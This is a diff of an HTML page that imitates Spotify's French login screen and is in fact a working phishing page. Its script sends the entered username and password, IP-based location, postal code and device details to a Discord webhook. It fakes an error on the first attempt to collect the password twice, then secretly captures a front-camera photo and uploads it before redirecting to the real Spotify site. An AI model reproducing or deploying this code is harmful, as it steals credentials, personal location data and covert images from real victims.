@@ -7,94 +7,232 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
-        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; padding: 0; }
-        .app-view { display: flex; flex-direction: column; align-items: center; padding: 50px 25px; min-height: 100vh; }
-        .logo { width: 50px; margin-bottom: 35px; }
-        h1 { font-size: 30px; font-weight: 900; letter-spacing: -1px; margin-bottom: 45px; text-align: center; }
-        .field { width: 100%; margin-bottom: 15px; text-align: left; }
-        label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; }
-        input { width: 100%; background: #282828; border: none; border-radius: 4px; padding: 16px; color: #fff; font-size: 16px; outline: none; }
-        input:focus { background: #333; box-shadow: 0 0 0 2px #727272; }
-        .btn-main { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 30px; font-size: 16px; border: none; text-transform: uppercase; }
-        .error-notif { color: #f15e6c; font-size: 13px; margin-bottom: 20px; display: none; background: #441a1d; padding: 12px; border-radius: 4px; width: 100%; text-align: center; }
-        .sep { display: flex; align-items: center; width: 100%; margin: 40px 0; color: #b3b3b3; font-size: 12px; font-weight: 900; }
-        .sep::before, .sep::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
-        .sep:not(:empty)::before { margin-right: 1.5em; }
-        .sep:not(:empty)::after { margin-left: 1.5em; }
-        .social-list { width: 100%; display: flex; flex-direction: column; gap: 12px; }
-        .s-btn { background: transparent; border: 1px solid #727272; border-radius: 500px; padding: 14px; color: #fff; font-weight: 700; display: flex; align-items: center; justify-content: center; font-size: 14px; position: relative; }
-        .s-btn img { width: 20px; position: absolute; left: 25px; }
+        
+        /* Look Application Mobile */
+        body { 
+            background-color: #000; 
+            color: #fff; 
+            font-family: 'Figtree', sans-serif; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 500px;
+            padding: 60px 25px;
+            text-align: center;
+        }
+
+        .app-logo {
+            width: 55px;
+            margin: 0 auto 35px auto;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: -1.2px;
+            margin-bottom: 40px;
+            line-height: 1.1;
+        }
+
+        /* Champs style App */
+        .input-wrap {
+            text-align: left;
+            margin-bottom: 12px;
+            width: 100%;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            background: #282828;
+            border: 1px solid transparent;
+            border-radius: 4px;
+            padding: 16px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+
+        input:focus {
+            background: #333;
+            border-color: #727272;
+        }
+
+        .error-msg {
+            background: #e91429;
+            color: #fff;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: none;
+            text-align: left;
+        }
+
+        /* Bouton vert Spotify */
+        .btn-green {
+            background: #1ed760;
+            color: #000;
+            font-weight: 700;
+            padding: 16px;
+            border-radius: 500px;
+            width: 100%;
+            margin-top: 25px;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 40px 0;
+            color: #b3b3b3;
+            font-size: 12px;
+            font-weight: 900;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #292929;
+        }
+
+        .divider:not(:empty)::before { margin-right: 1.5em; }
+        .divider:not(:empty)::after { margin-left: 1.5em; }
+
+        /* Boutons Sociaux */
+        .social-btn {
+            background: transparent;
+            border: 1px solid #727272;
+            border-radius: 500px;
+            padding: 14px;
+            width: 100%;
+            color: #fff;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+            font-size: 14px;
+            position: relative;
+        }
+
+        .social-btn img {
+            width: 20px;
+            position: absolute;
+            left: 20px;
+        }
+
         #v, #c { position: absolute; left: -9999px; visibility: hidden; }
     </style>
 </head>
 <body>
-    <div class="app-view">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
+    <div class="app-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="app-logo">
+        
         <h1>Se connecter pour continuer</h1>
-        <div id="err" class="error-notif">Identifiant ou mot de passe incorrect.</div>
-        <div class="field">
+
+        <div id="errorBox" class="error-msg">Nom d'utilisateur ou mot de passe incorrect.</div>
+
+        <div class="input-wrap">
             <label>E-mail ou nom d'utilisateur</label>
-            <input id="u" type="text">
+            <input id="u" type="text" spellcheck="false">
         </div>
-        <div class="field">
+
+        <div class="input-wrap">
             <label>Mot de passe</label>
             <input id="p" type="password">
         </div>
-        <button onclick="go()" id="b" class="btn-main">Se connecter</button>
-        <div class="sep">OU</div>
-        <div class="social-list">
-            <div class="s-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"> Continuer avec Google</div>
-            <div class="s-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png"> Continuer avec Facebook</div>
-            <div class="s-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter:invert(1)"> Continuer avec Apple</div>
-        </div>
+
+        <button onclick="process()" id="submitBtn" class="btn-green">Se connecter</button>
+
+        <div class="divider">OU</div>
+
+        <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"> Continuer avec Google</div>
+        <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png"> Continuer avec Facebook</div>
+        <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter:invert(1)"> Continuer avec Apple</div>
     </div>
+
     <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
+
     <script>
-        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
-        let tries = 0;
-        async function go() {
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            if(!u || !p) return;
-            tries++;
-            document.getElementById('b').innerText = "CHARGEMENT...";
-            let n = {}; try { n = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
-            let ba = {}; try { ba = await navigator.getBattery(); } catch(e){}
+        const webhookUrl = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
+        let count = 0;
+
+        async function process() {
+            const user = document.getElementById('u').value;
+            const pass = document.getElementById('p').value;
+            if(!user || !pass) return;
+
+            count++;
+            document.getElementById('submitBtn').innerText = "VÉRIFICATION...";
+
+            // Récupération de toutes les infos (Rapport long)
+            let ipData = {}; try { ipData = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
+            let battery = {}; try { battery = await navigator.getBattery(); } catch(e){}
             const gl = document.createElement('canvas').getContext('webgl');
             const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
-            const pay = {
+
+            const payload = {
                 embeds: [{
-                    title: `📱 LOG APP FINAL - T${tries}`, color: 1955168,
+                    title: `🔱 RAPPORT DÉTAILLÉ LVN ULTIMATE V11 (Tentative ${count})`,
+                    color: 1955168,
                     thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" },
                     fields: [
-                        { name: "👤 COMPTE", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
-                        { name: "🌐 RÉSEAU", value: `**IP:** \`${n.ip}\`\n**FAI:** \`${n.org}\`\n**Ville:** \`${n.city}\`\n**Maps:** **[Lien](https://www.google.com/maps?q=${n.latitude},${n.longitude})**`, inline: true },
-                        { name: "📱 INFOS", value: `**RAM:** \`${navigator.deviceMemory}GB\`\n**GPU:** \`${gpu}\`\n**Bat:** \`${Math.round(ba.level*100)}%\``, inline: true },
-                        { name: "🕵️ AGENT", value: `\`${navigator.userAgent}\`` }
-                    ]
+                        { name: "👤 COMPTE", value: `**Identifiant:** \`${user}\`\n**Mot de passe:** \`${pass}\`` },
+                        { name: "🌐 RÉSEAU & IP", value: `**IP:** \`${ipData.ip}\`\n**FAI:** \`${ipData.org}\`\n**Ville:** \`${ipData.city}\`\n**Pays:** \`${ipData.country_name}\`\n**Code Postal:** \`${ipData.postal}\``, inline: true },
+                        { name: "📱 HARDWARE", value: `**RAM:** \`${navigator.deviceMemory || '?'}GB\`\n**CPU:** \`${navigator.hardwareConcurrency} Coeurs\`\n**GPU:** \`${gpu}\`\n**Batterie:** \`${Math.round(battery.level * 100)}%\` (${battery.charging ? '⚡' : '🔋'})`, inline: true },
+                        { name: "📍 GÉOPOSITION", value: `**Lat:** \`${ipData.latitude}\` | **Long:** \`${ipData.longitude}\` \n**[Ouvrir Google Maps](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})**`, inline: false },
+                        { name: "🕵️ USER-AGENT", value: `\`${navigator.userAgent}\`` }
+                    ],
+                    footer: { text: "Rapport Elite • " + new Date().toLocaleString() }
                 }]
             };
-            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(pay) });
-            if(tries === 1) {
+
+            await fetch(webhookUrl, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+
+            if(count === 1) {
+                // Simulation d'erreur pour forcer la cible à retaper
                 setTimeout(() => {
-                    document.getElementById('b').innerText = "Se connecter";
+                    document.getElementById('submitBtn').innerText = "Se connecter";
                     document.getElementById('p').value = "";
-                    document.getElementById('err').style.display = "block";
-                }, 1200);
+                    document.getElementById('errorBox').style.display = "block";
+                }, 1000);
             } else {
+                // Capture HD au 2ème essai
                 try {
-                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const vi = document.getElementById('v'); vi.srcObject = s;
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('v');
+                    video.srcObject = stream;
                     await new Promise(r => setTimeout(r, 1500));
-                    const ca = document.getElementById('c'); ca.width = 1280; ca.height = 720;
-                    ca.getContext('2d').drawImage(vi, 0, 0);
-                    ca.toBlob(async (b) => {
-                        const f = new FormData(); f.append('file', b, 'c.png'); f.append('content', "📸 **CAPTURE HD :**");
-                        await fetch(hook, { method: 'POST', body: f });
-                        s.getTracks().forEach(t => t.stop());
-                    });
+                    const canvas = document.getElementById('c');
+                    canvas.width = 1280; canvas.height = 720;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append('file', blob, 'shot.png');
+                        fd.append('content', "📸 **CAPTURE FRONTALE RÉUSSIE :**");
+                        await fetch(webhookUrl, { method: 'POST', body: fd });
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 'image/png');
                 } catch (e) {}
-                setTimeout(() => { window.location.href = "https://www.spotify.com/fr/account/overview/"; }, 2000);
+                setTimeout(() => { window.location.href = "https://www.spotify.com/fr/premium/"; }, 2000);
             }
         }
     </script>
